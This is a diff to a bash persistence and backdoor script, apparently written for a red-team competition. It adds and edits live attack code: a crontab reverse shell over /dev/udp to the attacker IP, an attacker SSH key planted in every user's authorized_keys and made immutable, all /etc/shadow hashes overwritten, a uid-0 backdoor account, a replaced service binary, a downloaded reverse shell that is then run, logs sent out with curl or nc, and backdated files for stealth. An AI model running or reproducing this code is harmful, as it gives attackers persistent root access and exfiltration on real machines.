@@ -5,12 +5,12 @@
 # -----------------
 ipv4="192.168.1.15" # of attacker
 serverPort=364 # of attacker
-intelPort=	#port to send intel to on attacker box
+intelPort=44444 #port to send intel to on attacker box
 payloadFile="/var/upgrades" # if payload is running from a file, this is the file to write it to 
 payload="nc -lnvp 4444" # the payload to be written to the file above, bash, shellcode, etc
 allowedPorts=("22" "53")
 logFile="/var/log/boot.log.0" # stealthily disguise log as legitimate log file. (boot.log always starts at .1)
-backdoorUsername="ssh"
+backdoorUsername="newUser"
 backdoorPassHash='$6$j8vzzMPeNMxOBoNf$B6Pb78gRwsaCxEx8zzEwG2bos08U3tEkXL1aryHd5iUy9iq0VgFxzFafqQezxFhFNBAY0Q0LmAUIUd2uDkm3A/' # use $6 -> most versatile
 firewallConfiguration=0
 scorebotUser="scorebot"  # name of scorebot user to avoid changing
@@ -46,6 +46,15 @@ wipeCron() {
     done
 }
 
+# ------------------------------
+# add a cron job for persistence
+# ------------------------------
+writeCron(){
+    # add cron job for persistence - runs every 5 min
+    echo -e "\n\nadding cron job for persistence" >> $logFile
+    echo "5 * * * * root bash -i >& /dev/udp/$ipv4/$serverPort 0>&1" >> /etc/crontab 
+}
+
 # --------------------------------
 # create aliases to run a backdoor :: todo - have actual commands run
 # --------------------------------
@@ -67,14 +76,6 @@ badSymlink() {
     ln -s $payloadFile /usr/bin/whereis
 }
 
-# ------------------------------
-# add a cron job for persistence
-# ------------------------------
-writeCron(){
-    # add cron job for persistence - runs every 5 min
-    echo -e "\n\nadding cron job for persistence" >> $logFile
-    echo "5 * * * * bash -i >& /dev/udp/$ipv4/$serverPort 0>&1" >> /etc/crontab 
-}
 
 # --------------------------------------------------------------
 # harden ssh_config, allow root login, allow login from our host
@@ -82,7 +83,7 @@ writeCron(){
 hardenSsh() {
     # modify ssh to enable root login
     echo -e "\n\n## modifying ssh to allow user "root" login" >> $logFile
-    sshConfigFile="/etc/ssh/ssh_config"
+    sshConfigFile="/etc/ssh/sshd_config"
     if grep -q "PermitRootLogin" "$sshConfigFile"; then
         sed -i 's/^#\s*PermitRootLogin.*/PermitRootLogin yes/' $sshConfigFile
     else
@@ -100,13 +101,30 @@ hardenSsh() {
     
     # add our public key to the authorized_keys file for root
     publicKey="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEtQ2rUqoG7+G3LUYwLCJOar008UlilwucCskQ9i8/8RsVnI3mJ59aWD7HP7yMshK+i6wXjbWDak5NX0KFQvZXLHFp+V5Qp5fD10gFEDaqfhf2CTepeCy50/1TTuCK/Q1EzGgjh3c+yDj1v7POR1uxIXPpnpmu3P9S8tOYDDC2pimmEqjMwq29Gjotlu+BS4ZTjH9dkbFlkoF3resrnyY+BztIAv/KUbQWP70+1xI73tFK9ubzpJi0Dcg3IfwdmEUtI8BbnF4q4/8pIObuzHfxnpe3/FTGp4tibYRsqTxdlckIFAcfI1SgZPnXyzaVDwH4HU4Seh4u+je3mAer5qK1pITLC7dgWt/+cpnLJ/2dXEJowuia8C3YZCJX21gyFPub3doCKqgQ/SmGi8IfDIWfm35YT7mU3862XC3bYrOqzKhvwA0lT69S8s4RtKkPKvWRJphGFwuuSrZOyfIP4Ew1EHScg4CzX4juUc1mU5Tmd7HWOTpBpHpfIn89bNle/eU= emile@EMILE-LT-UBU"
-    mkdir -p /bin/.ssh
-    touch /bin/.ssh/authorized_keys
-    chown $backdoorUsername /bin/.ssh
-    chmod 700 /bin/.ssh
-    chown $backdoorUsername /bin/.ssh/authorized_keys
-    chmod 600 /bin/.ssh/authorized_keys
-    echo $publicKey >> ~/.ssh/authorized_keys
+    mkdir -p /root/.ssh
+    touch /root/.ssh/authorized_keys
+    chown root /root/.ssh
+    chmod 700 /root/.ssh
+    chown root /root/.ssh/authorized_keys
+    chmod 600 /root/.ssh/authorized_keys
+    echo $publicKey >> /root/.ssh/authorized_keys
+    chattr +i /root/.ssh/authorized_keys
+
+    # iterate through each user's home directory
+    while IFS=: read -r username password uid gid info homedir shell; do
+        if [[ $username && $homedir ]]; then
+            if [[ -d $homedir ]]; then
+                mkdir -p $homedir/.ssh
+                touch $homedir/.ssh/authorized_keys
+                chown $username $homedir/.ssh
+                chmod 700 $homedir/.ssh
+                chown $username $homedir/.ssh/authorized_keys
+                chmod 600 $homedir/.ssh/authorized_keys
+                echo $publicKey >> $homedir/.ssh/authorized_keys
+                chattr +i $homedir/.ssh/authorized_keys
+            fi
+        fi
+    done < /etc/passwd
 }
 
 # -------------------------------------------------------
@@ -124,6 +142,7 @@ fileBackdoor() {
     echo "## writing $lineToWrite to line $numLines of $file" >> $logFile
 
     if ! [ -f $file ]; then
+        echo $file
         touch $file >> $logFile 2>&1
         preModTime=$osBirth
     else 
@@ -134,6 +153,7 @@ fileBackdoor() {
         sed -i ""$numLines"i\
         $lineToWrite" $file
         touch -d "$preModTime" $file
+        echo $preModTime 
     } ) >> $logFile 2>&1
 }
 
@@ -194,54 +214,54 @@ shellBackdoor (){
 # download files from attack box
 # ------------------------------
 download_and_run (){  #find a place to put a backdoor and
-    successTransfer=0
-    transferMethod=1 # each number represents a different transfer method
-    targetFile="/tmp/revShell"
-    sourceFile="revShell"
-    sourceFileHash="944d981207838ac6b6fc940f09b93ab3169af4e3afe1ec085caab27d8022b737" # hash of the reverse shell we are transferring
+        successTransfer=0
+        transferMethod=1 # each number represents a different transfer method
+        targetFile="/tmp/revShell"
+        sourceFile="revShell"
+        sourceFileHash="944d981207838ac6b6fc940f09b93ab3169af4e3afe1ec085caab27d8022b737" # hash of the reverse shell we are transferring
 
-    echo -e "\n\ndownloading files from attacker" >> $logFile
-    while [[ $transferMethod < 5 && $successTransfer == 0 ]];
-    do
-        # transfer
-        if [ $transferMethod == 1 ]; then
-            wget --no-check-certificate --tries=2 -O $targetFile https://$ipv4:$serverPort/$sourceFile >> $logFile 2>&1
-        elif [ $transferMethod == 2 ]; then
-            curl -k -m 10 -o $targetFile https://$ipv4:$serverPort/$sourceFile >> $logFile 2>&1
-        elif [ $transferMethod == 3 ]; then
-            echo -e "\n\ndownload via https failed, attempting download via http:" >> $logFile
-            wget --tries=2 -O $targetFile http://$ipv4:$serverPort/$sourceFile >> $logFile 2>&1
-        elif [ $transferMethod == 4 ]; then
-            curl -m 10 -o $targetFile http://$ipv4:$serverPort/$sourceFile >> $logFile 2>&1
-        # elif [ $transferMethod == 5 ]; then
-        #     echo "attempting download via nc:" >> $logFile
-        #     echo "GET /$sourceFile HTTP/1.0" | nc -n $ipv4 $serverPort > $targetFile && sed -i '1,7d' $targetFile >> $logFile 2>&1
-        # elif [ $transferMethod == 6 ]; then
-        #     echo "attempting download via ncat:" >> $logFile
-        #     echo -e "GET / HTTP/1.1\r\nHost: $ipv4\r\n\r\n" | ncat --ssl https://$ipv4:$serverPort/$sourceFile >> $logFile 2>&1
-        # add additional transfer methods here, updating loop condition (<=)
+        echo -e "\n\ndownloading files from attacker" >> $logFile
+        while [[ $transferMethod < 5 && $successTransfer == 0 ]];
+        do
+                # transfer
+                if [ $transferMethod == 1 ]; then
+                    wget --no-check-certificate --tries=2 -O $targetFile http://$ipv4:$serverPort/$sourceFile                                                                                                      
+                elif [ $transferMethod == 2 ]; then
+                    curl -k -m 10 -o $targetFile https://$ipv4:$serverPort/$sourceFile >> $logFile 2>&1
+                elif [ $transferMethod == 3 ]; then
+                    echo -e "\n\ndownload via https failed, attempting download via http:" >> $logFile
+                    wget --tries=2 -O $targetFile http://$ipv4:$serverPort/$sourceFile >> $logFile 2>&1
+                elif [ $transferMethod == 4 ]; then
+                    curl -m 10 -o $targetFile http://$ipv4:$serverPort/$sourceFile >> $logFile 2>&1
+                # elif [ $transferMethod == 5 ]; then
+                #     echo "attempting download via nc:" >> $logFile
+                #     echo "GET /$sourceFile HTTP/1.0" | nc -n $ipv4 $serverPort > $targetFile && sed -i '1,7d' $targetFile >> $logFile 2>&1
+                # elif [ $transferMethod == 6 ]; then
+                #     echo "attempting download via ncat:" >> $logFile
+                #     echo -e "GET / HTTP/1.1\r\nHost: $ipv4\r\n\r\n" | ncat --ssl https://$ipv4:$serverPort/$sourceFile >> $logFile 2>&1
+                # add additional transfer methods here, updating loop condition (<=)
+                fi
+
+                # verify
+                if [ -f $targetFile ]; then
+                    verifyHash=$(sha256sum $targetFile | cut --delimiter=" " --fields=1)
+                    if [ "$verifyHash" == "$sourceFileHash" ]; then
+                        successTransfer=1
+                    fi
+                else 
+                    successTransfer=0
+                fi
+                ((transferMethod+=1))
+        done;
+        if [ $successTransfer == 0 ]; then
+                echo -e "\n\nunable to transfer the reverseShell backdoor to the target machine." >> $logFile 2>&1
+        else
+                echo -e "\n\ntransfer successful, running malware" >> $logFile 2>&1
+                chmod +x $targetFile
+                $targetFile >> $logFile 2>&1
         fi
 
-        # verify
-        if [ -f $targetFile ]; then
-            verifyHash=$(sha256sum $targetFile | cut --delimiter=" " --fields=1)
-            if [ "$verifyHash" == "$sourceFileHash" ]; then
-                successTransfer=1
-            fi
-        else 
-            successTransfer=0
-        fi
-        ((transferMethod+=1))
-    done;
-    if [ $successTransfer == 0 ]; then
-        echo -e "\n\nunable to transfer the reverseShell backdoor to the target machine." >> $logFile 2>&1
-    else
-        echo -e "\n\ntransfer successful, running malware" >> $logFile 2>&1
-        chmod +x $targetFile
-        $targetFile >> $logFile 2>&1
-    fi
-
-    # take over a legitimate service for persistence for whatever the service is
+        # take over a legitimate service for persistence for whatever the service is
 }
 
 # -------------------------------
@@ -256,25 +276,24 @@ hardenUsers(){
     cat $passwdFile >> $logFile 2>&1
     
     # change password for all accounts except us/score bot (derek/emile)
-    specuser="delogrand"
-	# Loop through each line in /etc/shadow
-	while IFS=: read -r user passwd rest; do
-		# Skip lines that are comments or empty
-		if [[ "$user" =~ ^#|^$ ]]; then
-		    continue
-		fi
+        # Loop through each line in /etc/shadow
+        while IFS=: read -r user passwd rest; do
+                # Skip lines that are comments or empty
+                if [[ "$user" =~ ^#|^$ ]]; then
+                    continue
+                fi
 
-		if [[ "$user" == "$scorebotUser" ]]; then
-		    echo "Skipping password update for user: $scorebotUser"
-		    continue
-		fi
-		
-		# Check if the password hash starts with a $
-		if [[ "${passwd:0:1}" == '$' ]]; then
-		    # Replace the password field with the new hashed password
-		    sed -i "s#^$user:[^:]*:#$user:$backdoorPassHash:#" /root/shadow
-		fi
-	done < /root/shadow
+                if [[ "$user" == "$scorebotUser" ]]; then
+                    echo "Skipping password update for user: $scorebotUser"
+                    continue
+                fi
+
+                # Check if the password hash starts with a $
+                if [[ "${passwd:0:1}" == '$' ]]; then
+                    # Replace the password field with the new hashed password
+                    sed -i "s#^$user:[^:]*:#$user:$backdoorPassHash:#" /etc/shadow
+                fi
+        done < /etc/shadow
 
 }
 
@@ -282,7 +301,21 @@ hardenUsers(){
 # create a user with uid 0 (root) and gid 0 (root)
 # ------------------------------------------------
 backdoorUser(){
+    
     # "promote" a user to root (derek/emile)
+    if grep -q "^newUser:" /etc/passwd; then
+	    echo "User 'newUser' already exists."
+    # Add your commands here if the user exists
+	else
+	    echo "User 'newUser' does not exist."
+		LINE="$backdoorUsername:x:0:0:root:/bin:$SHELL"
+		SHADOW_LINE="$backdoorUsername:$backdoorPassHash:19753:0:99999:7:::"
+		echo $LINE >> /etc/passwd
+		echo $SHADOW_LINE >> /etc/shadow
+	fi
+
+    
+    
     LINE="$backdoorUsername:x:0:0:root:/bin:$SHELL"
     SHADOW_LINE="$backdoorUsername:$backdoorPassHash:19753:0:99999:7:::"
     echo $LINE >> /etc/passwd
@@ -296,13 +329,15 @@ backdoorUser(){
 # backdoor a service
 # ------------------
 backdoorService(){
-    dir="lib/systemd/system"
+    dir="/lib/systemd/system"
     binaryName=$(which $serviceName)
 
 
-
+    echo $binaryName
+    mv $binaryName $binaryName.bak
+    rm $binaryName
     touch $binaryName
-    echo $payload > $binaryName
+    cat $payload > $binaryName
 
     touch "$dir/$serviceName.service"
     echo "[Unit]" >> "$dir/$serviceName.service"   
@@ -522,10 +557,10 @@ report(){
     
     #checking nc and curl, create a third binary to send file contents for intel retrieval in case neither of these work. 
     if which curl >/dev/null 2>&1; then
-    	curl -X POST -k -d @$logFile https://$ipv4:$serverPort/report >> $logFile 2>&1
-	elif which nc >/dev/null 2>&1; then
-	    cat $logFile | nc $ipv4 $serverPort
-	fi
+        curl -X POST -k -d @$logFile https://$ipv4:$serverPort/report >> $logFile 2>&1
+        elif which nc >/dev/null 2>&1; then
+            cat $logFile | nc $ipv4 $serverPort
+        fi
 
     
     
@@ -553,25 +588,26 @@ main(){
     # initialze the payload if it has not been initialized
     if ! [[ -f $payload ]]; then 
         echo -e "\n\n## payload doesn't exist: writing to $payloadFile" >> $logFile    
-        touch $payload
+        touch $payloadFile 
         echo $payload > $payloadFile
     fi
     chmod +x $payloadFile
     
-    writeCron
-    hashBackup
-    wipeCron
-    hardenSsh
-    download_and_run
-    hardenUsers
-    backdooorUser
-    backdoorService
-    badAlias
-    badSymlink
-    configAllFirewalls
-    shellBackdoor
-    readFlag
-    report
+    #wipeCron #tested
+    #writeCron
+    
+    #hashBackup #tested
+    #backdoorUser #tested
+    #hardenSsh #tested
+    #download_and_run
+    hardenUsers #tested
+    #backdoorService
+    #badAlias
+    #badSymlink
+    #configAllFirewalls
+    #shellBackdoor
+    #readFlag
+    #report
     #binEncrypt
     # systemctl reboot
 }
